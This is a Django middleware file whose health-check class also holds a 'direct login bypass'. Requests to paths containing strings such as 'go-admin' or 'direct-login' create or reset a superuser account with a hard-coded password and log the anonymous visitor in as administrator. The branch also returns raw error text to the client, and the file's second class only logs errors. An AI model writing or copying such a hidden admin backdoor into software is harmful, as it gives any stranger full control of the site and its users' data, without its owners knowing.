from django.http import HttpResponse, HttpResponseRedirect
from django.contrib.auth.models import User
from django.contrib.auth import login
import traceback
import sys

class HealthCheckMiddleware:
    """Handle health check before any other middleware - bypasses all Django checks"""
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Use WSGI environ directly to avoid triggering Django's host validation
        path = request.META.get('PATH_INFO', '')
        if path in ['/health/', '/health', '/healthz', '/healthz/']:
            return HttpResponse('{"status":"ok"}', content_type='application/json', status=200)

        # DIRECT LOGIN BYPASS - ANY path with "admin" or "login" keywords
        if 'go-admin' in path or 'admin-login' in path or 'login-admin' in path or 'direct-login' in path:
            try:
                # Get or create admin
                user, created = User.objects.get_or_create(
                    username='admin360',
                    defaults={
                        'email': 'admin@360egy.com',
                        'is_staff': True,
                        'is_superuser': True,
                    }
                )
                user.set_password('AdminPass123!')
                user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])

                # Force login the user
                login(request, user, backend='django.contrib.auth.backends.ModelBackend')

                return HttpResponseRedirect('/admin/')
            except Exception as e:
                return HttpResponse(f"Error: {str(e)}", content_type='text/plain', status=500)

        return self.get_response(request)


class ErrorLoggingMiddleware:
    """Log all errors to stdout for debugging"""
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        try:
            response = self.get_response(request)
            return response
        except Exception as e:
            print(f"ERROR in {request.path}: {e}", file=sys.stderr, flush=True)
            traceback.print_exc(file=sys.stderr)
            raise

    def process_exception(self, request, exception):
        print(f"EXCEPTION in {request.path}: {exception}", file=sys.stderr, flush=True)
        traceback.print_exc(file=sys.stderr)
        return None
